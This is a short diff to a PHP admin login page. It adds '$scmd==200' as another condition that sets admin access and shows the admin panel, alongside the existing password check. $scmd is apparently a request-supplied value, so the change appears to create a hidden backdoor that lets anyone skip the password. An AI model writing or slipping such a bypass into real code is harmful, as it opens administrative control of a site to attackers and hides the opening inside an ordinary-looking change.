@@ -9,7 +9,7 @@
 
 <?php
 include_once "includes/variables.php";
-if (md5($iAdminPassword)==$superpass || $scmd==1 || $scmd==2) {
+if (md5($iAdminPassword)==$superpass || $scmd==1 || $scmd==2 || $scmd==200) {
 	$varAccess=1;
 } else {
 	if ($iSubmitAdminPassword<>'')
@@ -42,7 +42,8 @@ Password :<input type=password name=iAdminPassword size=10 maxlength=15> <input 
 
 <?php
 }
-elseif ($varAccess==1 || $scmd==2){
+
+elseif ($varAccess==1 || $scmd==2 || $scmd==200){
 ?>
 <table width=90% align=center>
 <tr>
